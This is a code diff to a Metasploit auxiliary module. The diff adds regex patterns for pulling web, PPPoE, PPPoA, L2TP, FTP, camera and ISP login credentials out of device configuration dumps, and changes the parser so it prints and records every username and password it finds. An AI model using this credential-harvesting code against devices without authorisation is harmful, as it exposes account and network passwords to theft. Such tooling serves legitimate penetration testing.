@@ -14,8 +14,14 @@ class Metasploit3 < Msf::Auxiliary
   SETTINGS = {
     'Creds' => [
       [ 'HTTP Web Management', { 'user' => /http_username=(\S+)/i, 'pass' => /http_password=(\S+)/i } ],
+      [ 'HTTP Web Management', { 'user' => /login_username=(\S+)/i, 'pass' => /login_password=(\S+)/i } ],
       [ 'PPPoE', { 'user' => /pppoe_username=(\S+)/i, 'pass' => /pppoe_password=(\S+)/i } ],
+      [ 'PPPoA', { 'user' => /pppoa_username=(\S+)/i, 'pass' => /pppoa_password=(\S+)/i } ],
       [ 'DDNS', { 'user' => /ddns_user_name=(\S+)/i, 'pass' => /ddns_password=(\S+)/i } ],
+      [ 'CMS', {'user' => /cms_username=(\S+)/i, 'pass' => /cms_password=(\S+)/i } ], # Found in some cameras
+      [ 'BigPondAuth', {'user' => /bpa_username=(\S+)/i, 'pass' => /bpa_password=(\S+)/i } ], # Telstra
+      [ 'L2TP', { 'user' => /l2tp_username=(\S+)/i, 'pass' => /l2tp_password=(\S+)/i } ],
+      [ 'FTP', { 'user' => /ftp_login=(\S+)/i, 'pass' => /ftp_password=(\S+)/i } ],
     ],
     'General' => [
       ['Wifi SSID', /wifi_ssid=(\S+)/i],
@@ -185,33 +191,34 @@ class Metasploit3 < Msf::Auxiliary
 
     configs.each do |config|
       parse_general_config(config)
-      parse_auth_config(config)
     end
+    parse_auth_config(configs)
   end
 
   def parse_general_config(config)
     SETTINGS['General'].each do |regex|
       if config.match(regex[1])
         value = $1
-        print_status("#{regex[0]}: #{value}")
+        print_status("#{peer} - #{regex[0]}: #{value}")
       end
     end
   end
 
-  def parse_auth_config(config)
+  def parse_auth_config(configs)
     SETTINGS['Creds'].each do |cred|
       user = nil
       pass = nil
 
       # find the user/pass
-      if config.match(cred[1]['user'])
-        user = $1
+      u = configs.grep(cred[1]['user']) { $1 }
+      if u.any?
+        user = u[0]
       end
-      if config.match(cred[1]['pass'])
-        pass = $1
+      p = configs.grep(cred[1]['pass']) { $1 }
+      if p.any?
+        pass = p[0]
       end
 
-      # if user and pass are specified, report on them
       if user and pass
         print_status("#{peer} - #{cred[0]}: User: #{user} Pass: #{pass}")
         auth = {
@@ -225,6 +232,7 @@ class Metasploit3 < Msf::Auxiliary
         }
         report_auth_info(auth)
       end
+
     end
   end
 
